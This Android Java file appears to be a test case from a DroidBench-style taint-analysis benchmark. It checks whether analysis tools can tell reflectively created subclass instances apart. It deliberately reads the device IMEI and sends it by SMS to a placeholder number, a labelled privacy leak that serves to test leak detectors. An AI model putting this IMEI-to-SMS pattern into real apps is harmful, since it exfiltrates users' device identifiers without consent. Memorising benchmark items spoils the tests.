package ubc.yingying.reflection2test3;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;



/**
 * @Description The benchmark is an extension of DroidBench-Reflection-Reflection2.
 * When there are several derived classes from the same abstract base class, and there are
 * instances of different derived classes. Tool should be able to distinguish instances from
 * different derived classes
 *
 * (Specific to this testcase, the tool should know only bc3 is tainted, and bc4 is not tainted at all)
 *
 *
 * @ExpectedSources:
 * line 50: getDeviceId()
 *
 * @ExpectedSinks:
 * line 51: [leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 * line 54: [no leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 *
 * @NumberOfExpectedLeaks: 1
 *
 * @FlowPaths:
 * Path1:
 * line 50: bc3.imei = telephonyManager.getDeviceId(); -->
 * line 51: sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  --> leak
 *
 */

public class MainActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {

            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager sms = SmsManager.getDefault();

            BaseClass2 bc3 = (BaseClass2) Class.forName("ubc.yingying.reflection2test3.ConcreteClass3").newInstance();
            bc3.imei = telephonyManager.getDeviceId(); // source
            sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  // sink, leak

            BaseClass2 bc4 = (BaseClass2) Class.forName("ubc.yingying.reflection2test3.ConcreteClass4").newInstance();
            sms.sendTextMessage("+49 4444", null, bc4.foo(), null, null); // sink, no leak


        } catch (InstantiationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }




}
